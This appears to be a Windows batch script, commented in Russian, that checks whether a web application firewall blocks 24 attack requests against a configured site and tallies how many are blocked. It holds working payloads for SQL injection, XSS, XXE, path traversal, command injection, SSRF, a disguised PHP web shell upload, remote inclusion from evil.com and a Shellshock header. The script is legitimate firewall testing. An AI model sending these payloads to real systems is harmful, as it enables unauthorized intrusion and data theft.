@echo off
REM WAF тесты с использованием curl для Windows
setlocal enabledelayedexpansion

REM Конфигурация - укажите здесь целевой сайт
set BASE_URL=https://msproject.site.net/console

REM Инициализация переменных для статистики
set TOTAL_TESTS=24
set BLOCKED=0

echo 🚀 Начинаем тестирование атак на WAF...
echo 📋 Всего запланировано тестов: %TOTAL_TESTS%
echo 🎯 Целевой сайт: %BASE_URL%
echo.

echo.
echo === Тест 1: SQL Injection ===
curl -s -X GET "%BASE_URL%/search?q=1%%27+OR+%%271%%27%%3D%%271" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 2: Cross-Site Scripting (HTML) ===
curl -s -X POST "%BASE_URL%/search" ^
-H "Content-Type: application/x-www-form-urlencoded" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-d "q=<script>alert(1)</script>" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 3: Cross-Site Scripting (URL) ===
curl -s -X GET "%BASE_URL%/redirect?url=javascript:alert(1)" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 4: XML External Entities (XXE) ===
curl -s -X POST "%BASE_URL%/api/xml" ^
-H "Content-Type: application/xml" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-d "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 5: Path Traversal ===
curl -s -X GET "%BASE_URL%/files?file=../../../etc/passwd" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 6: NoSQL Injection ===
curl -s -X POST "%BASE_URL%/search" ^
-H "Content-Type: application/json" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-d "{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 7: OS Command Injection ===
curl -s -X GET "%BASE_URL%/status?cmd=ping;cat%%20/etc/passwd" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 8: Server-Side Request Forgery (SSRF) ===
curl -s -X GET "%BASE_URL%/proxy?url=http://169.254.169.254/latest/meta-data/" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 9: Local File Inclusion (LFI) ===
curl -s -X GET "%BASE_URL%/include?file=../../../etc/passwd%%00" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 10: Server-Side Template Injection (SSTI) ===
curl -s -X POST "%BASE_URL%/profile" ^
-H "Content-Type: application/x-www-form-urlencoded" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-d "name={{7*7}}&email=test@example.com" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 11: XPath Injection ===
curl -s -X GET "%BASE_URL%/users?xpath=/users/user%%5Busername/text()=%%27admin%%27%%20or%%20%%271%%27=%%271%%27%%5D" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 12: XML Injection ===
curl -s -X POST "%BASE_URL%/api/xml" ^
-H "Content-Type: application/xml" ^
-H "Accept: application/xml" ^
-H "User-Agent: sqlmap/1.4.7" ^
-d "<?xml version=\"1.0\" encoding=\"UTF-8\"?><user><id>1 OR 1=1</id><name>test' OR '1'='1</name></user>" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 13: Open Redirect ===
curl -s -X GET "%BASE_URL%/redirect?url=http://evil.com/shell.php" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 14: Web Shell Upload ===
REM Создаем временный файл для multipart-данных
echo -----------------------------974767299852498929531610575> webshell_payload.txt
echo Content-Disposition: form-data; name="file"; filename="shell.php.png">> webshell_payload.txt
echo Content-Type: image/png>> webshell_payload.txt
echo.>> webshell_payload.txt
echo GIF87a;>> webshell_payload.txt
echo ^<?php>> webshell_payload.txt
echo   system('id');>> webshell_payload.txt
echo ^?^>>> webshell_payload.txt
echo -----------------------------974767299852498929531610575-->> webshell_payload.txt

curl -s -X POST "%BASE_URL%/upload" ^
-H "Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575" ^
-H "User-Agent: Nessus/8.10.1" ^
-H "X-Requested-With: XMLHttpRequest" ^
-d @webshell_payload.txt | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

REM Удаляем временный файл
del webshell_payload.txt

echo.
echo === Тест 15: Cross-Site Request Forgery (CSRF) ===
curl -s -X POST "%BASE_URL%/login" ^
-H "Content-Type: application/x-www-form-urlencoded" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-H "Origin: evil.com" ^
-H "Referer: evil.com/csrf.html" ^
-H "X-CSRF-Token: fake-token" ^
-d "username=<script>alert(document.cookie)</script>&password=password&action=login" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 16: Vulnerability Scanner ===
curl -s -X GET "%BASE_URL%/include?file=../../../../etc/passwd%%00" ^
-H "User-Agent: Nessus SOAP" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 17: Automated Bot User Agent ===
curl -s -X POST "%BASE_URL%/search" ^
-H "Content-Type: application/json" ^
-H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)" ^
-d "{\"search\": {\"$where\": \"function() { return true; }\"}, \"limit\": 1}" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 18: Malformed HTTP Request ===
curl -s -X GET "%BASE_URL%/files?file=../../../etc/passwd" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-H "X-Custom-IP-Authorization: 127.0.0.1" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 19: Response Splitting ===
curl -s -X GET "%BASE_URL%/include?file=http://evil.com/shell.php" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-H "X-Forwarded-For: 127.0.0.1\r\nContent-Length: 0\r\n\r\n<html><body>Injected Content</body></html>" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 20: JWT Attack (None Algorithm) ===
curl -s -X GET "%BASE_URL%/api/admin?alg=none&debug=true" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9." | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 21: Large Body Test ===
echo Генерация большого payload...
set "BIG_JSON={\"data\": \""
REM Уменьшаем количество символов для предотвращения ошибки "Input line is too long"
for /L %%i in (1,1,1000) do (
  set "BIG_JSON=!BIG_JSON!A"
)
set "BIG_JSON=!BIG_JSON!\"}"

REM Сохраняем большой payload во временный файл
echo !BIG_JSON! > large_payload.txt

curl -s -X POST "%BASE_URL%/api/data" ^
-H "Content-Type: application/json" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-d @large_payload.txt | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

REM Удаляем временный файл с payload
del large_payload.txt

echo.
echo === Тест 22: LFI with PHP Wrapper ===
curl -s -X GET "%BASE_URL%/download?file=php://filter/convert.base64-encode/resource=/etc/passwd&type=lfi" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 23: RCE via User-Agent ===
curl -s -X GET "%BASE_URL%/" ^
-H "User-Agent: () { :; }; /bin/bash -c \"cat /etc/passwd\"" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

echo.
echo === Тест 24: GraphQL Introspection ===
curl -s -X POST "%BASE_URL%/graphql" ^
-H "Content-Type: application/json" ^
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" ^
-d "{\"query\": \"query{__schema{types{name,fields{name}}}}\"}" | findstr /C:"Transaction ID" /C:"Forbidden"
if !errorlevel! equ 0 set /a BLOCKED+=1

REM Вычисляем количество разрешенных тестов
set /a ALLOWED=%TOTAL_TESTS%-%BLOCKED%

echo.
echo 📊 ====== ОТЧЕТ О ТЕСТИРОВАНИИ PTAF PRO ======
echo.
echo 🎯 Всего тестов: %TOTAL_TESTS%
echo 🛡️ Успешно заблокировано: %BLOCKED% из %TOTAL_TESTS%
echo ⚠️ Разрешено (не заблокировано): %ALLOWED% из %TOTAL_TESTS%
echo.
echo 🎯 ======================================
echo.
echo Код 403 Forbidden означает успешное блокирование WAF
echo.

endlocal 